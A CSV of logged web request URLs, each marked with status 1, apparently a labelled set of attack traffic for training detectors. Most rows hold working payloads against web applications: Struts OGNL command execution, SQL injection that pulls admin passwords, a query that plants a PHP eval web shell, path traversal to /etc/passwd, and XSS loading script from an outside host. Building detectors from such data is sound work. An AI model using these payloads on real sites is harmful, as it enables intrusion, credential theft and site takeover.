request_url,status
/scripts/simple/view_page?mv_arg=|cat%20/etc/passwd|,1
/ll_demo_name=../data/admin/config_update.php,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001001&page=3,1
username=%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27netstat%20-an%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23process.getInputStream%28%29%29%29%7D,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=1,1
"plus/search.php?keyword=as&typeArr[111%3D@`\\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\\'`+]=a",1
http:/jycw.sdei.edu.cn/plus/advancedsearch.php?mid=1&_SESSION[123]=update%20%60%23@__mytag%60%20set%20normbody=0x3C3F706870206576616C28245F504F53545B635D293B3F3E%20where%20aid=1%20limit%201&sqlhash=123,1
http:/www.sddkj.gov.cn/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php,1
step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002001&page=4,1
/HBSC/Services/zwfwzx/a_article.jsp?SiteID=96&aid=d571619e-59f1-4140-bd03-67316b9ca279,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002005&page=3,1
/trsapp/add.html?isNeedTheme=0&flag=WEB-INF%5Cweb.xml&groupId=2&appId=1585,1
/trsapp/add.html?isNeedTheme=0&flag=WEB-INF%2Fweb.xml%3F&groupId=2&appId=1585,1
/trsapp/add.html?isNeedTheme=WEB-INF%2Fweb.xml&flag=0&groupId=2&appId=1585,1
/trsapp/add.html?isNeedTheme=0&flag=0&groupId=WEB-INF%5Cweb.xml&appId=1585,1
/trsapp/add.html?isNeedTheme=0&flag=0&groupId=2&appId=WEB-INF%5Cweb.xml,1
/zhiding2.action?zhandianid=file://etc/passwd&lanmuid=1233,1
/zhiding2.action?zhandianid=29&lanmuid=file://etc/passwd,1
/zhiding2.action?zhandianid=29&lanmuid=/etc/passwd%00.html,1
/zhiding2.action?contentid=%25%7B619675356-356210421%7D&fxlanmuid=670&zhandianid=29,1
/zhiding2.action?zhandianid=29&lanmuid=%25%7B619675356-356210421%7D,1
/zhiding2.action?lanmuid=/etc/passwd%00.html,1
/wszj.html?TB_iframe=true&width=640&height=$%7B619675356-356210421%7D,1
/wszj.html?TB_iframe=true&width=640&height=%25%7B619675356-356210421%7D,1
/zhiding2.action?lanmuid=file://etc/passwd,1
/zhiding2!fw.action?lanmuid=%25%7B619675356-356210421%7D,1
/zhiding2%21fw.action?lanmuid=$%7B619675356-356210421%7D,1
/zhiding2.action?contentid=c:/windows/win.ini,1
/zhiding2.action?other=$%7B619675356-356210421%7D&bmfw=11&lanmuid=0,1
/zhiding2.action?contentid=http/./..././..././..././..././..././..././.../windows/win.ini,1
/zhiding2%21fw.action?current=1&zhandianid=$%7B619675356-356210421%7D&lanmuid=674,1
/zhiding2!ks.action?type=1&lanmuid=%25%7B619675356-356210421%7D,1
/plus/advancedsearch.php?mid=1&_SESSION[123]=update%20%60%23@__mytag%60%20set%20normbody=0x3C3F706870206576616C28245F504F53545B635D293B3F3E%20where%20aid=1%20limit%201&sqlhash=123,1
/zhiding2.action?current=%25%7B619675356-356210421%7D&wenzhang=&zhandianid=29&lanmuid=0,1
"/NewsType.asp?SmallClass=%27%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20%27%27=%27",1
/142.news.commentlist.dhtml?news_id=file%3A%2F%2F%2Fetc%2Fpasswd,1
/common.login.login.dhtml?username=&loginsave=&password=.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2Fetc%2Fpasswd,1
/22.search.list.dhtml?page=&keyword=1&key_position=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini,1
http:/www.sddkj.gov.cn/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php,1
http:/b2cmob.bxmedia.net/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php,1
"ids=0&table=article%20where%20html=2%20and%20id=0%20union%20select%202,2,username,userpassword,userpassword,login_key%20from%20pa_member%20where%20id=2%20union%20select%20id,site_dir,static_dir,static_file,lanmu_id,sublanmu_id%20from%20article",1
"/news/js.php?f_id=1)%20UnIoN%20SeLeCt%201,Md5(1234),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23&type=hot",1
"/coupon/s.php?action=search&keyword=11&fid=1&fids%5B%5D=0)%20UnIoN%20SeLeCt%20Md5(1234),2,3,4,5,6,7,8,9%23",1
/HBSC/Search/AdvanceResult.jsp?query=&#60;/script&#62;&#60;a%20href=%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2397%26%23108%26%23101%26%23114%26%23116%26%2340%26%2349%26%2341&#62;XSStest&#60;/a&#62;&site=42,1
/HBSC/Search/AdvanceResult.jsp?query=\/&#62;&#60;img%20src=@%20onerror=alert(0315)%20/&#62;&site=42,1
/HBSC/Search/AdvanceResult.jsp?startdate=\/&#62;&#60;iframe/src=/www.163.com/?/&#62;&enddate=&title=&author=&site=42&content=&query=1,1
/HBSC/Search/AdvanceResult.jsp?query=/&#62;&#60;iframe/src=/www.163.com/?/&#62;&site=42,1
/HBSC/Search/AdvanceResult.jsp?query='/&#62;&#60;ScRiPt&#62;confirm(0341)&#60;/ScRiPt&#62;&site=42,1
/HBSC/Search/AdvanceResult.jsp?startdate=&enddate=&#62;&#60;img%20src=@%20onerror=alert(2237)%20/&#62;&title=&author=&site=42&content=&query=1,1
/HBSC/Search/Result.jsp?query=&#62;&#60;a%20href=%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2397%26%23108%26%23101%26%23114%26%23116%26%2340%26%2349%26%2341&#62;XSStest&#60;/a&#62;&indexid=siteid&site=31,1
/HBSC/Search/Result.jsp?query=&#60;/title&#62;'&#60;ScRiPt&#62;confirm(2813)&#60;/ScRiPt&#62;&indexid=siteid&site=31,1
/HBSC/Search/AdvanceResult.jsp?startdate=&enddate=&title=&author=&site=42&content='/&#62;&#60;img%20src=@%20onerror=alert(8334)%20/&#62;&query=1,1
/HBSC/Search/Result.jsp?query=&#60;/title&#62;'&#60;ScRiPt&#62;confirm(4449)&#60;/ScRiPt&#62;&indexid=siteid&site=42,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;'&#60;ScRiPt&#62;confirm(5647)&#60;/ScRiPt&#62;&indexid=siteid&site=42,1
/HBSC/Search/Result.jsp?query='/&#62;&#60;ScRiPt&#62;confirm(9336)&#60;/ScRiPt&#62;&indexid=siteid&site=42,1
/HBSC/Search/Result.jsp?query='/&#62;'&#60;ScRiPt&#62;confirm(3352)&#60;/ScRiPt&#62;&indexid=siteid&site=42,1
/HBSC/Search/Result.jsp?query='&#60;ScRiPt&#62;confirm(9627)&#60;/ScRiPt&#62;&indexid=siteid&site=42,1
/HBSC/Search/Result.jsp?query='/&#62;1&#60;ScRiPt/ksc%20src%3d/axss.xyz/t/xss.js%3f985739&#62;&#60;/ScRiPt&#62;&indexid=siteid&site=42,1
/HBSC/Search/Result.jsp?query=&#60;/title&#62;&#60;iframe/src=/www.163.com/?/&#62;&indexid=siteid&site=42,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;a/href=/www.baidu.com/?&#62;XssTest&#60;/a&#62;&indexid=siteid&site=42,1
/HBSC/Search/Result.jsp?query='/&#62;&#60;a/href=/www.baidu.com/?&#62;XssTest&#60;/a&#62;&indexid=siteid&site=42,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002001&page=4,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=3,1
/HBSC/Search/Result.jsp?query=&#60;img%20src=@%20onerror=alert(5609)%20/&#62;&indexid=siteid&site=31,1
/HBSC/Search/Result.jsp?query=&#60;/title&#62;&#60;iframe/src=/www.163.com/?/&#62;&indexid=siteid&site=31,1
/HBSC/Search/Result.jsp?indexid=siteid&site=31&Submit=%3F%3F%3F%3F%3F%3F&id=33&query=1&order=&#60;/script&#62;1&#60;ScRiPt/ksc%20src%3d/axss.xyz/t/xss.js%3f985739&#62;&#60;/ScRiPt&#62;,1
/HBSC/Search/Result.jsp?indexid=siteid&site=31&Submit=%3F%3F%3F%3F%3F%3F&id=33&query=1&order='/&#62;'&#60;ScRiPt&#62;confirm(7372)&#60;/ScRiPt&#62;,1
/HBSC/Search/Result.jsp?indexid=siteid&site=31&Submit=%3F%3F%3F%3F%3F%3F&id=33&query=1&order=&#60;/script&#62;'&#60;ScRiPt&#62;confirm(5997)&#60;/ScRiPt&#62;,1
/HBSC/Search/Result.jsp?query=&#60;/title&#62;'&#60;ScRiPt&#62;confirm(4800)&#60;/ScRiPt&#62;&indexid=siteid&site=28,1
/HBSC/Search/Result.jsp?indexid=siteid&site=31&Submit=%3F%3F%3F%3F%3F%3F&id=33&query=1&order=&#60;/script&#62;&#60;ScRiPt&#62;confirm(0449)&#60;/ScRiPt&#62;,1
/HBSC/Search/Result.jsp?query=&#60;/title&#62;&#60;img%20src=@%20onerror=alert(1629)%20/&#62;&indexid=siteid&site=28,1
/HBSC/Search/Result.jsp?indexid=siteid&site=31&Submit=%3F%3F%3F%3F%3F%3F&id=33&query=1&order='/&#62;1&#60;ScRiPt/ksc%20src%3d/axss.xyz/t/xss.js%3f985739&#62;&#60;/ScRiPt&#62;,1
/HBSC/Search/Result.jsp?indexid=siteid&site=31&Submit='/&#62;&#60;ScRiPt&#62;confirm(4006)&#60;/ScRiPt&#62;&time=month&query=1&id=33,1
/index.php?id=1%20AND%201=1%20UNION%20ALL%20SELECT%201%2C2%2C3%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%20..%2F..%2F..%2Fetc%2Fpasswd,1
/index.php?username=&password=&cookietime=..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2Fwindows%2Fwin.ini,1
/index.php?username=&password=&cookietime=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,1
/index.php?s=..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini,1
/index.php?s=..%2F...%2F..%2F.%2F..%2F...%2F..%2F.%2F..%2F...%2F..%2F.%2F..%2F...%2F..%2F.%2F..%2F...%2F..%2F.%2F..%2F...%2F..%2F.%2Fwindows%2Fwin.ini,1
/index.php?s=..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2Fwindows%2Fwin.ini,1
/index.php?username=&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&cookietime=2592000,1
/HBSC/Search/AdvanceResult.jsp?query=&#60;/script&#62;&#60;a/href=/www.baidu.com/?&#62;XssTest&#60;/a&#62;&site=44,1
/HBSC/Search/AdvanceResult.jsp?query='/&#62;&#60;ScRiPt&#62;confirm(5011)&#60;/ScRiPt&#62;&site=80,1
/index.php?username=&password=&cookietime=%28SELECT%209805%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b706a71%2C%28SELECT%20%28ELT%289805%3D9805%2C1%29%29%29%2C0x716b767071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29,1
/index.php?mm=2%29%20AND%20%28SELECT%209437%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a627671%2C%28SELECT%20%28ELT%289437%3D9437%2C1%29%29%29%2C0x7170627871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%288192%3D8192&srchtxt=,1
/index.php?mm=%28SELECT%20%28CASE%20WHEN%20%288726%3D8523%29%20THEN%208726%20ELSE%208726%2A%28SELECT%208726%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29&srchtxt=,1
/index.php?username=%25%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29COJd%29%20AND%20%27%25%27%3D%27&password=&cookietime=2592000,1
/index.php?mm=2&srchtxt=%28SELECT%20%28CASE%20WHEN%20%281409%3D9485%29%20THEN%201409%20ELSE%201409%2A%28SELECT%201409%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29,1
/HBSC/Search/Result.jsp?query='/&#62;'&#60;ScRiPt&#62;confirm(9353)&#60;/ScRiPt&#62;&indexid=siteid&site=49,1
/index.php?s=%2FIndex%2Fzthc_list%2Ftitle%2F%E5%AD%A6%E4%B9%A0%E8%B4%AF%E5%BD%BB%E5%85%9A%E7%9A%84%E5%8D%81%E4%B9%9D%E5%A4%A7%E7%B2%BE%E7%A5%9E%E4%B8%93%E6%A0%8F%2Fp%2F6.html%29%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29PSjo%29%20AND%20%282152%3D2152,1
/index.php?username=%27%29%20AND%207676%3D%28SELECT%207676%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27FZkE%27%3D%27FZkE&password=&cookietime=2592000,1
/index.php?username=%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29COJd%29--%20XCkQ&password=&cookietime=2592000,1
/index.php?username=&password=%29%20AND%203002%3D%28SELECT%203002%20FROM%20PG_SLEEP%285%29%29%20AND%20%288734%3D8734&cookietime=2592000,1
/index.php?username=&password=&cookietime=2592000%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29Qnws%29%20AND%20%27ybiz%27%3D%27ybiz,1
/index.php?mod=%28SELECT%20%28CASE%20WHEN%20%283627%3D2208%29%20THEN%203627%20ELSE%203627%2A%28SELECT%203627%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29&action=moderate&fid=2&infloat=yes&nopost=yes,1
/index.php?mm=2%25%27%20AND%20%28SELECT%209437%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a627671%2C%28SELECT%20%28ELT%289437%3D9437%2C1%29%29%29%2C0x7170627871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27%25%27%3D%27&srchtxt=,1
/index.php?mod=topicadmin%20AND%20%28SELECT%206169%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71766b7671%2C%28SELECT%20%28ELT%286169%3D6169%2C1%29%29%29%2C0x7162627871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29&action=moderate&fid=2&infloat=yes&nopost=yes,1
/index.php?s=%2FIndex%2Fzthc_list%2Ftitle%2F%E5%AD%A6%E4%B9%A0%E8%B4%AF%E5%BD%BB%E5%85%9A%E7%9A%84%E5%8D%81%E4%B9%9D%E5%A4%A7%E7%B2%BE%E7%A5%9E%E4%B8%93%E6%A0%8F%2Fp%2F6.html%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29PSjo%29--%20Ueai,1
/index.php?mm=2&srchtxt=%27%29%20AND%20%28SELECT%204339%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178627871%2C%28SELECT%20%28ELT%284339%3D4339%2C1%29%29%29%2C0x71787a7871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27aysQ%27%3D%27aysQ,1
/index.php?mod=topicadmin&action=moderate%20AND%20%28SELECT%204789%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71716b6a71%2C%28SELECT%20%28ELT%284789%3D4789%2C1%29%29%29%2C0x716b6b6a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20HWgt&fid=2&infloat=yes&nopost=yes,1
/index.php?mod=topicadmin&action=moderate&fid=%28SELECT%20%28CASE%20WHEN%20%286827%3D6827%29%20THEN%206827%20ELSE%206827%2A%28SELECT%206827%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29&infloat=yes&nopost=yes,1
/index.php?mod=topicadmin&action=moderate&fid=2%29%20AND%20%28SELECT%207738%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%287738%3D7738%2C1%29%29%29%2C0x716a6b6271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%285105%3D5105&infloat=yes&nopost=yes,1
/index.php?mm=2&srchtxt=%27%20AND%20%28SELECT%204339%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178627871%2C%28SELECT%20%28ELT%284339%3D4339%2C1%29%29%29%2C0x71787a7871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27hgje%27%3D%27hgje,1
/index.php?s=%2FIndex%2Fzthc_list%2Ftitle%2F%E5%AD%A6%E4%B9%A0%E8%B4%AF%E5%BD%BB%E5%85%9A%E7%9A%84%E5%8D%81%E4%B9%9D%E5%A4%A7%E7%B2%BE%E7%A5%9E%E4%B8%93%E6%A0%8F%2Fp%2F6.html%27%29%20AND%207812%3D%28SELECT%207812%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27XNeN%27%3D%27XNeN,1
/index.php?mod=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&action=moderate&fid=2&infloat=yes&nopost=yes,1
/HBSC/Search/Result.jsp?button='/&#62;&#60;a%20href=%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2397%26%23108%26%23101%26%23114%26%23116%26%2340%26%2349%26%2341&#62;XSStest&#60;/a&#62;&indexid=26&site=24&id=26&query=1&page=5,1
/HBSC/Search/Result.jsp?indexid=siteid&site=80&Submit=%3F%3F%3F%3F%3F%3F&time=&#60;/script&#62;'&#60;ScRiPt&#62;confirm(8446)&#60;/ScRiPt&#62;&query=1&id=75,1
/HBSC/Search/Result.jsp?indexid=siteid&site=80&Submit=%3F%3F%3F%3F%3F%3F&time=&#60;/script&#62;1&#60;ScRiPt/ksc%20src%3d/axss.xyz/t/xss.js%3f985739&#62;&#60;/ScRiPt&#62;&query=1&id=75,1
/HBSC/Search/Result.jsp?query=1&indexid=siteid&site=41&Submit='/&#62;&#60;iframe/src=/www.163.com/?/&#62;,1
/HBSC/Search/Result.jsp?indexid=siteid&site=80&Submit=%3F%3F%3F%3F%3F%3F&time='/&#62;&#60;ScRiPt&#62;confirm(6805)&#60;/ScRiPt&#62;&query=1&id=75,1
/HBSC/Search/Result.jsp?indexid=siteid&site=80&Submit=%3F%3F%3F%3F%3F%3F&time='/&#62;1&#60;ScRiPt/ksc%20src%3d/axss.xyz/t/xss.js%3f985739&#62;&#60;/ScRiPt&#62;&query=1&id=75,1
/HBSC/Search/Result.jsp?indexid=siteid&site=80&Submit=%3F%3F%3F%3F%3F%3F&time='/&#62;'&#60;ScRiPt&#62;confirm(7054)&#60;/ScRiPt&#62;&query=1&id=75,1
/HBSC/Search/Result.jsp?query=&#60;/title&#62;&#60;ScRiPt&#62;confirm(3008)&#60;/ScRiPt&#62;&indexid=siteid&site=33,1
/voteApp/SuggestionShow.aspx?SuggestionID=(SELECT%20(CASE%20WHEN%20(91=91)%20THEN%2076%20ELSE%2091*(SELECT%2091%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS)%20END)),1
/voteApp/SuggestionShow.aspx?SuggestionID=76AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))uttes),1
/voteApp/SuggestionShow.aspx?SuggestionID=76'%20AND%201471=UTL_INADDR.GET_HOST_ADDRESS(CHR(101)%7C%7CCHR(99)%7C%7CCHR(114)%7C%7CCHR(121)%7C%7CCHR(58)%7C%7CCHR(102)%7C%7C(SELECT%20(CASE%20WHEN%20(630=630)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(105)%7C%7CCHR(110)%7C%7CCHR(100)%7C%7CCHR(58)%7C%7CCHR(120)%7C%7CCHR(108))%20AND%20'OGmp'='OGmp,1
/voteApp/SuggestionShow.aspx?SuggestionID=76%25'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(104)%7C%7CCHR(107)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(49)%7C%7CCHR(57)%7C%7CCHR(57)%7C%7CCHR(55)))%20FROM%20DUAL)%20AND%20'%25'=',1
"/voteApp/SuggestionShow.aspx?SuggestionID=76)%20AND(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20(SELECT%20CONCAT(0x5e5e5e,unhex(Hex(cast(database()%20as%20char))),0x5e5e5e))%20FROM%20INFORMATION_SCHEMA.TABLES%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20x)a)%20AND%20(9=9",1
"/voteApp/SuggestionShow.aspx?SuggestionID=76,(SELECT%20(CASE%20WHEN%20(86=86)%20THEN%2076%20ELSE%2086*(SELECT%2086%20FROM%20mysql.db)%20END))",1
/HBSC/Services/AuthCode.jsp?Width=76&Height=21%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.cuoxeavx.com%2Frudxa.html%22&#37;3E&1547035590415,1
/HBSC/Services/AuthCode.jsp?Width=76&Height=21&1547035590415%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Frjanh.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E,1
/HBSC/Services/AuthCode.jsp?Width=76%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.nwwpzoin.com%2Fglpch.html%22&#37;3E&Height=21&1547035590415,1
/HBSC/Services/linyeju/wtjd_article.jsp?ID=19665%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Fxeegj.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E,1
/HBSC/Services/linyeju/wtjd.jsp?var=&#60;/script&#62;&#60;svg/%20onload=mkpzwn(6633)&#62;,1
/HBSC/Services/linyeju/wtjd.jsp?&#60;/script&#62;&#60;audio%20src=mkpzwn%20onerror=mkpzwn(6045)&#62;,1
/HBSC/Services/linyeju/wtjd.jsp?var=&#60;/script&#62;&#60;iframe%20src=jav\\x61scr\\x69pt:mkpzwn(6633)&#62;,1
/HBSC/Services/AuthCode.jsp?Width=60&Height=18%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.mfoenugl.com%2Fphxoe.html%22&#37;3E,1
/HBSC/Services/cangzhougovcn/zwzx/ggzyjy_list.jsp?page=102%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.eyualpcz.com%2Fhsaju.html%22&#37;3E&key=018001004,1
/HBSC/Services/AuthCode.jsp?Width=60%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.oxqzsony.com%2Foyzul.html%22&#37;3E&Height=18,1
/HBSC/Services/cangzhougovcn/zwzx/ggzyjy_list.jsp?page=102%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.katdrzml.com%2Ffqjzl.html%22&#37;3E&key=018001004,1
/HBSC/Services/cangzhougovcn/zwzx/ggzyjy_list.jsp?key=018001004&page=102,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002005&page=2,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=2,1
